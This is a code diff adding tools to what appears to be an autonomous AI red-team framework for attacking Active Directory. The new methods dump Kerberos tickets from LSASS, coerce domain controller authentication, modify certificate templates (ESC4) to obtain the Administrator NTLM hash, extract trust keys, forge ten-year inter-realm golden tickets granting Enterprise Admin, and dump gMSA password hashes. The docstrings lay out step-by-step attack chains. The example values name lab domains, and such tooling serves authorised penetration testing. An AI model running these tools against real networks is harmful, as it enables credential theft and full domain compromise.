@@ -487,6 +487,145 @@ class DelegationTools(Toolset):
         except Exception as e:
             return f"Add computer failed: {e}"
 
+    @dn.tool_method
+    def unconstrained_tgt_dump(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        target_host: str,
+    ) -> str:
+        """
+        Dump TGTs from LSASS on a host with unconstrained delegation.
+
+        When you have code execution on a host with unconstrained delegation,
+        use this to extract TGTs from LSASS. These TGTs can be used to
+        impersonate the authenticated users.
+
+        Attack workflow:
+        1. Identify hosts with unconstrained delegation (find_delegation)
+        2. Get code execution on the unconstrained host (psexec, wmiexec)
+        3. Dump TGTs from LSASS (this tool)
+        4. Use extracted TGTs for impersonation
+
+        Args:
+            domain: Target domain
+            username: Admin username for remote execution
+            password: Password for authentication
+            dc_ip: Domain controller IP
+            target_host: Host with unconstrained delegation
+
+        Returns:
+            Extracted TGTs and their details
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # Use lsassy for remote TGT extraction
+        cmd = [
+            "lsassy",
+            "-d",
+            domain,
+            "-u",
+            username,
+            "-p",
+            resolved_password or "",
+            target_host,
+            "-m",
+            "direct",  # Direct memory read
+        ]
+
+        try:
+            logger.info(f"[*] Dumping TGTs from LSASS on {target_host}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Look for TGT indicators
+            if "krbtgt" in result.lower() or "tgt" in result.lower():
+                logger.warning("[!] TGTs found in LSASS dump!")
+                result = (
+                    "🎫 TGTs EXTRACTED FROM UNCONSTRAINED DELEGATION HOST!\n"
+                    f"→ Host: {target_host}\n"
+                    "→ Look for TGTs from privileged users (Domain Admins, DC$)\n"
+                    "→ Use extracted tickets with pass-the-ticket\n"
+                    "→ If DC$ TGT found: instant DA access!\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"TGT dump failed: {e}"
+
+    @dn.tool_method
+    def unconstrained_coerce_and_capture(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        target_host: str,
+        coerce_from: str,
+        listener_ip: str,
+    ) -> str:
+        """
+        Coerce authentication to an unconstrained delegation host to capture TGT.
+
+        When you have control of a host with unconstrained delegation, coerce
+        a DC or privileged server to authenticate. The TGT will be cached in
+        the unconstrained host's LSASS.
+
+        Attack workflow:
+        1. Get access to unconstrained delegation host
+        2. Coerce DC to authenticate to the unconstrained host
+        3. DC's TGT is cached in LSASS
+        4. Extract TGT using unconstrained_tgt_dump
+        5. Use DC TGT for DCSync
+
+        Args:
+            domain: Target domain
+            username: Admin username on unconstrained host
+            password: Password for authentication
+            target_host: Host with unconstrained delegation (our controlled host)
+            coerce_from: Host to coerce (typically a DC)
+            listener_ip: IP where TGT will be captured (the unconstrained host)
+
+        Returns:
+            Coercion result and next steps
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        # Use SpoolSample/PrinterBug for coercion
+        cmd = [
+            "printerbug.py",
+            f"{domain}/{username}:{resolved_password}",
+            coerce_from,
+            listener_ip,
+        ]
+
+        try:
+            logger.info(f"[*] Coercing {coerce_from} to authenticate to {listener_ip}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            return (
+                f"🎯 COERCION TRIGGERED\n"
+                f"→ Coerced {coerce_from} to authenticate to {listener_ip}\n"
+                f"→ If {target_host} has unconstrained delegation:\n"
+                f"   1. The TGT from {coerce_from} is now cached in LSASS\n"
+                f"   2. Use unconstrained_tgt_dump to extract it\n"
+                f"   3. Use the TGT for pass-the-ticket attacks\n\n"
+                f"NEXT STEP:\n"
+                f'   unconstrained_tgt_dump(target_host="{target_host}", ...)\n\n' + result
+            )
+
+        except Exception as e:
+            return f"Coercion for unconstrained delegation failed: {e}"
+
 
 class CertipyTools(Toolset):
     """Tools for AD Certificate Services (ADCS) enumeration and exploitation.
@@ -933,6 +1072,179 @@ class CertipyTools(Toolset):
         except Exception as e:
             return f"Certipy shadow failed: {e}"
 
+    @dn.tool_method
+    def certipy_template_esc4(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        template: str,
+    ) -> str:
+        """
+        Modify a certificate template for ESC4 exploitation.
+
+        ESC4 occurs when a user has write permissions (GenericAll, WriteDacl, etc.)
+        on a certificate template. This tool modifies the template to:
+        - Allow enrollment by low-privileged users
+        - Enable Client Authentication EKU
+        - Allow specifying Subject Alternative Name (SAN)
+
+        IMPORTANT: This modifies the template with -save-old to preserve the
+        original configuration for later restoration.
+
+        After modification, use certipy_request to request a certificate as
+        Administrator, then certipy_auth to get the NTLM hash.
+
+        Args:
+            domain: Target domain
+            username: User with write permissions on the template
+            password: Password for authentication
+            dc_ip: Domain controller IP
+            template: Certificate template name to modify
+
+        Returns:
+            Template modification result (saves backup of original config)
+
+        Example:
+            >>> certipy_template_esc4("example.local", "user", "pass", "192.168.58.10", "ESC4")
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        cmd = [
+            "certipy",
+            "template",
+            "-u",
+            f"{username}@{domain}",
+            "-p",
+            resolved_password or "",
+            "-dc-ip",
+            dc_ip,
+            "-template",
+            template,
+            "-save-old",  # Save original config for restoration
+        ]
+
+        try:
+            logger.info(f"[*] Modifying certificate template {template} for ESC4 exploitation")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "successfully" in result.lower() or "saved" in result.lower():
+                logger.warning(f"[!] Template {template} modified for ESC4!")
+                result = (
+                    f"🚨 TEMPLATE {template} MODIFIED FOR ESC4!\n"
+                    "→ Original configuration saved (use -configuration to restore)\n"
+                    "→ Template now allows enrollment with SAN specification\n"
+                    "→ NEXT STEPS:\n"
+                    "   1. Use certipy_request with -upn administrator@domain\n"
+                    "   2. Use certipy_auth with the .pfx file\n"
+                    "   3. Get Administrator NTLM hash!\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Certipy template modification failed: {e}"
+
+    @dn.tool_method
+    def certipy_esc4_full_chain(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        template: str,
+        ca: str,
+        target_upn: str = "Administrator",
+    ) -> str:
+        """
+        Execute complete ESC4 attack chain in one step.
+
+        This combines all ESC4 exploitation steps:
+        1. Modify template to allow client auth with SAN
+        2. Request certificate as target user (Administrator)
+        3. Authenticate with certificate to get NTLM hash
+
+        Use when you have GenericAll/WriteDacl on a certificate template.
+
+        Args:
+            domain: Target domain
+            username: User with write permissions on the template
+            password: Password for authentication
+            dc_ip: Domain controller IP
+            template: Certificate template name
+            ca: Certificate Authority name
+            target_upn: User to impersonate (default: Administrator)
+
+        Returns:
+            Full chain result including NTLM hash if successful
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        results = []
+
+        # Step 1: Modify template
+        logger.info(f"[*] ESC4 Chain Step 1: Modifying template {template}")
+        template_result = self.certipy_template_esc4(
+            domain=domain,
+            username=username,
+            password=password,
+            dc_ip=dc_ip,
+            template=template,
+        )
+        results.append(f"=== STEP 1: TEMPLATE MODIFICATION ===\n{template_result}\n")
+
+        if "failed" in template_result.lower() or "error" in template_result.lower():
+            return "\n".join(results) + "\n❌ ESC4 chain failed at template modification step"
+
+        # Step 2: Request certificate
+        logger.info(f"[*] ESC4 Chain Step 2: Requesting certificate as {target_upn}")
+        request_result = self.certipy_request(
+            domain=domain,
+            username=username,
+            password=password,
+            dc_ip=dc_ip,
+            ca=ca,
+            template=template,
+            upn=target_upn,
+        )
+        results.append(f"=== STEP 2: CERTIFICATE REQUEST ===\n{request_result}\n")
+
+        # Extract PFX path from result
+        pfx_match = re.search(r"(\S+\.pfx)", request_result)
+        if not pfx_match:
+            return "\n".join(results) + "\n❌ ESC4 chain failed: No PFX file created"
+
+        pfx_path = pfx_match.group(1)
+
+        # Step 3: Authenticate with certificate
+        logger.info("[*] ESC4 Chain Step 3: Authenticating with certificate")
+        auth_result = self.certipy_auth(
+            domain=domain,
+            dc_ip=dc_ip,
+            pfx_path=pfx_path,
+        )
+        results.append(f"=== STEP 3: CERTIFICATE AUTHENTICATION ===\n{auth_result}\n")
+
+        # Check for success
+        if "hash" in auth_result.lower():
+            final_message = (
+                f"🚨 ESC4 FULL CHAIN COMPLETE!\n"
+                f"→ Template {template} modified\n"
+                f"→ Certificate obtained for {target_upn}\n"
+                f"→ NTLM hash extracted!\n"
+                f"→ Use hash for pass-the-hash or secretsdump\n\n"
+            )
+            return final_message + "\n".join(results)
+
+        return "\n".join(results) + "\n⚠️ ESC4 chain completed but hash extraction may have failed"
+
 
 class TrustAttackTools(Toolset):
     """Tools for Active Directory trust relationship attacks.
@@ -1001,3 +1313,381 @@ class TrustAttackTools(Toolset):
 
         except Exception as e:
             return f"raiseChild failed: {e}"
+
+    @dn.tool_method
+    def extract_trust_key(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        trusted_domain: str,
+    ) -> str:
+        """
+        Extract trust key for cross-domain/cross-forest attacks.
+
+        Requires Domain Admin on the source domain. The trust key is the NTLM hash
+        of the trust account (TRUSTEDDOMAIN$) which can be used to create inter-realm
+        tickets for cross-forest pivoting.
+
+        Attack chain:
+        1. Extract trust key (this tool)
+        2. Get domain SIDs for both domains (get_sid)
+        3. Create inter-realm ticket (create_inter_realm_ticket)
+        4. Use ticket to access target forest
+
+        Args:
+            domain: Source domain where you have DA (e.g., 'sevenkingdoms.local')
+            username: Domain Admin username
+            password: DA password
+            dc_ip: Source domain controller IP
+            trusted_domain: Target trusted domain (e.g., 'essos.local' or 'ESSOS')
+
+        Returns:
+            Trust key (NTLM hash of trust account)
+
+        Example:
+            >>> extract_trust_key("sevenkingdoms.local", "Administrator", "pass", "192.168.58.10", "essos.local")
+        """
+        # Normalize trusted domain name to get trust account
+        # Trust accounts are NETBIOS$, e.g., ESSOS$
+        trust_domain_name = trusted_domain.split(".", maxsplit=1)[0].upper()
+        trust_account = f"{trust_domain_name}$"
+
+        cmd = [
+            "impacket-secretsdump",
+            f"{domain}/{username}:{password}@{dc_ip}",
+            "-just-dc-user",
+            trust_account,
+        ]
+
+        try:
+            logger.info(f"[*] Extracting trust key for {trusted_domain} from {domain}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Look for NTLM hash in output
+            # Format: DOMAIN\TRUSTACCOUNT$:RID:LM:NT:::
+            hash_match = re.search(
+                rf"{trust_account}:\d+:[a-fA-F0-9]{{32}}:([a-fA-F0-9]{{32}})",
+                result,
+                re.IGNORECASE,
+            )
+
+            if hash_match:
+                trust_hash = hash_match.group(1)
+                logger.warning(f"[+] Trust key extracted for {trusted_domain}!")
+                result = (
+                    f"🚨 TRUST KEY EXTRACTED FOR {trusted_domain}!\n"
+                    f"→ Trust account: {trust_account}\n"
+                    f"→ NTLM hash: {trust_hash}\n"
+                    f"→ Use with create_inter_realm_ticket for cross-forest access\n"
+                    f"→ ATTACK CHAIN:\n"
+                    f"   1. Get both domain SIDs with get_sid\n"
+                    f"   2. Create inter-realm ticket with create_inter_realm_ticket\n"
+                    f"   3. Use ticket to secretsdump target forest DCs\n\n" + result
+                )
+
+                # Add trust key as hash to state for tracking
+                if self.state:
+                    from ares.core.models import Hash, SharedRedTeamState
+
+                    trust_hash_obj = Hash(
+                        username=trust_account,
+                        hash_value=trust_hash,
+                        hash_type="NTLM",
+                        domain=domain,
+                        source="trust_key_extraction",
+                    )
+                    if isinstance(self.state, SharedRedTeamState):
+                        self.state.add_hash(trust_hash_obj, "extract_trust_key")
+                    elif hasattr(self.state, "hashes"):
+                        self.state.hashes.append(trust_hash_obj)
+
+            return result
+
+        except Exception as e:
+            return f"Trust key extraction failed: {e}"
+
+    @dn.tool_method
+    def create_inter_realm_ticket(
+        self,
+        source_domain: str,
+        source_sid: str,
+        trust_key: str,
+        target_domain: str,
+        target_sid: str,
+        username: str = "Administrator",
+        duration: int = 3650,
+    ) -> str:
+        """
+        Create inter-realm golden ticket for cross-forest attack.
+
+        Use after extracting trust key with extract_trust_key. Creates a ticket
+        that grants Enterprise Admin access in the target forest.
+
+        Args:
+            source_domain: Domain where we have DA (e.g., 'sevenkingdoms.local')
+            source_sid: SID of source domain (from get_sid)
+            trust_key: NTLM hash of trust account (from extract_trust_key)
+            target_domain: Target trusted domain (e.g., 'essos.local')
+            target_sid: SID of target domain (from get_sid on target)
+            username: User to impersonate (default: Administrator)
+            duration: Ticket validity in days (default: 3650 = 10 years)
+
+        Returns:
+            Ticket generation result (saves .ccache file)
+
+        Example:
+            >>> create_inter_realm_ticket(
+            ...     "sevenkingdoms.local",
+            ...     "S-1-5-21-123...",
+            ...     "aad3b435...",
+            ...     "essos.local",
+            ...     "S-1-5-21-456...",
+            ... )
+        """
+        # Create Enterprise Admins SID for target forest (-519)
+        enterprise_admin_sid = f"{target_sid}-519"
+
+        cmd = [
+            "impacket-ticketer",
+            "-nthash",
+            trust_key,
+            "-domain-sid",
+            source_sid,
+            "-domain",
+            source_domain,
+            "-extra-sid",
+            enterprise_admin_sid,
+            "-spn",
+            f"krbtgt/{target_domain}",
+            "-duration",
+            str(duration),
+            username,
+        ]
+
+        try:
+            logger.info(
+                f"[*] Creating inter-realm ticket for {username} "
+                f"({source_domain} → {target_domain})"
+            )
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if ".ccache" in result:
+                ticket_match = re.search(r"([^\s]+\.ccache)", result)
+                ticket_path = ticket_match.group(1) if ticket_match else f"{username}.ccache"
+                logger.warning(f"[+] Inter-realm ticket created: {ticket_path}")
+                result = (
+                    f"🚨 INTER-REALM TICKET CREATED!\n"
+                    f"→ Ticket: {ticket_path}\n"
+                    f"→ User: {username}\n"
+                    f"→ Access: Enterprise Admin in {target_domain}\n"
+                    f"→ NEXT STEPS:\n"
+                    f"   1. export KRB5CCNAME={ticket_path}\n"
+                    f"   2. secretsdump_kerberos to dump {target_domain} DCs\n"
+                    f"   3. Full forest compromise achieved!\n\n" + result
+                )
+
+                if self.state:
+                    self.state.has_golden_ticket = True
+                    if hasattr(self.state, "operation_timeline"):
+                        from ares.core.models import TimelineEvent
+
+                        event = TimelineEvent(
+                            id=f"evt-interrealm-{uuid.uuid4().hex[:8]}",
+                            timestamp=datetime.now(timezone.utc),
+                            source="create_inter_realm_ticket",
+                            event_type="inter_realm_ticket",
+                            description=f"Inter-realm ticket created for cross-forest attack: {source_domain} → {target_domain}",
+                            mitre_technique="T1558.001",
+                        )
+                        self.state.operation_timeline.append(event)
+
+            return result
+
+        except Exception as e:
+            return f"Inter-realm ticket creation failed: {e}"
+
+
+class GMSATools(Toolset):
+    """Tools for Group Managed Service Account (gMSA) password retrieval."""
+
+    state: AnyRedTeamState | None = None
+
+    def set_state(self, state: AnyRedTeamState) -> None:
+        """Set the operation state for this toolset."""
+        self.state = state
+
+    @dn.tool_method
+    def gmsa_dump_passwords(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+    ) -> str:
+        """Dump gMSA (Group Managed Service Account) passwords.
+
+        gMSA accounts have auto-rotating passwords managed by AD. If you have
+        read access to the msDS-ManagedPassword attribute (via PrincipalsAllowedToRetrieveManagedPassword),
+        you can retrieve the NTLM hash of the gMSA account.
+
+        gMSA accounts often have:
+        - Service account privileges on multiple servers
+        - SQL Server service accounts (can lead to xp_cmdshell)
+        - IIS/web application service accounts
+        - Scheduled task execution privileges
+
+        Args:
+            domain: Target domain (e.g., 'contoso.local')
+            username: User with gMSA read rights
+            password: Password for authentication
+            dc_ip: Domain controller IP
+
+        Returns:
+            gMSA account names and their NTLM hashes
+        """
+        resolved_password = resolve_password(self.state, username, domain, password)
+        if not resolved_password:
+            return f"❌ No password available for {username}@{domain}"
+
+        cmd = [
+            "gMSADumper.py",
+            "-d",
+            domain,
+            "-u",
+            username,
+            "-p",
+            resolved_password,
+            "-l",
+            dc_ip,
+        ]
+
+        try:
+            logger.info(f"[*] Dumping gMSA passwords from {domain}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Extract gMSA hashes from output
+            # Pattern: gMSA_Account$:::NTLM_HASH
+            hash_pattern = r"(\S+\$?):::([a-fA-F0-9]{32})"
+            found_hashes = []
+
+            for match in re.finditer(hash_pattern, result):
+                account = match.group(1)
+                ntlm_hash = match.group(2)
+                found_hashes.append((account, ntlm_hash))
+
+                logger.warning(f"[+] gMSA hash found: {account}")
+
+                if self.state and hasattr(self.state, "add_hash"):
+                    hash_obj = Hash(
+                        username=account,
+                        hash_value=ntlm_hash,
+                        hash_type="NTLM",
+                        domain=domain,
+                        source="gMSADumper",
+                    )
+                    self.state.add_hash(hash_obj)  # type: ignore[union-attr]
+
+            if found_hashes:
+                hash_summary = "\n".join(f"  - {acc}: {h[:16]}..." for acc, h in found_hashes)
+                return (
+                    f"✅ gMSA passwords retrieved!\n"
+                    f"Found {len(found_hashes)} gMSA account(s):\n{hash_summary}\n\n"
+                    f"→ Use these hashes with pass-the-hash (psexec/wmiexec) on servers where gMSA has access\n"
+                    f"→ gMSA accounts often run SQL Server, IIS, or scheduled tasks\n\n"
+                    f"{result}"
+                )
+
+            return f"gMSADumper result (no hashes extracted):\n{result}"
+
+        except Exception as e:
+            return f"gMSADumper failed: {e}"
+
+    @dn.tool_method
+    def gmsa_read_password_bloodyad(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        gmsa_account: str,
+    ) -> str:
+        """Read a specific gMSA account's password using bloodyAD.
+
+        Alternative to gMSADumper for targeted gMSA password retrieval.
+        Use this when you know the specific gMSA account name.
+
+        Args:
+            domain: Target domain (e.g., 'contoso.local')
+            username: User with gMSA read rights
+            password: Password for authentication
+            dc_ip: Domain controller IP
+            gmsa_account: gMSA account name (e.g., 'svc_sql$')
+
+        Returns:
+            gMSA account NTLM hash
+        """
+        resolved_password = resolve_password(self.state, username, domain, password)
+        if not resolved_password:
+            return f"❌ No password available for {username}@{domain}"
+
+        cmd = [
+            "bloodyAD",
+            "-d",
+            domain,
+            "-u",
+            username,
+            "-p",
+            resolved_password,
+            "--host",
+            dc_ip,
+            "get",
+            "object",
+            gmsa_account,
+            "--attr",
+            "msDS-ManagedPassword",
+        ]
+
+        try:
+            logger.info(f"[*] Reading gMSA password for {gmsa_account}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # bloodyAD returns the password data which can be converted to NTLM
+            if "msDS-ManagedPassword" in result or "NTLM" in result.upper():
+                hash_match = re.search(r"([a-fA-F0-9]{32})", result)
+                if hash_match:
+                    ntlm_hash = hash_match.group(1)
+                    logger.warning(
+                        f"[+] gMSA hash retrieved for {gmsa_account}: {ntlm_hash[:16]}..."
+                    )
+
+                    if self.state and hasattr(self.state, "add_hash"):
+                        hash_obj = Hash(
+                            username=gmsa_account,
+                            hash_value=ntlm_hash,
+                            hash_type="NTLM",
+                            domain=domain,
+                            source="bloodyAD_gMSA",
+                        )
+                        self.state.add_hash(hash_obj)  # type: ignore[union-attr]
+
+                    return (
+                        f"✅ gMSA password retrieved for {gmsa_account}!\n"
+                        f"→ NTLM: {ntlm_hash[:16]}...\n"
+                        f"→ Use pass-the-hash on servers where {gmsa_account} has access\n\n"
+                        f"{result}"
+                    )
+
+            return f"bloodyAD gMSA result:\n{result}"
+
+        except Exception as e:
+            return f"bloodyAD gMSA read failed: {e}"
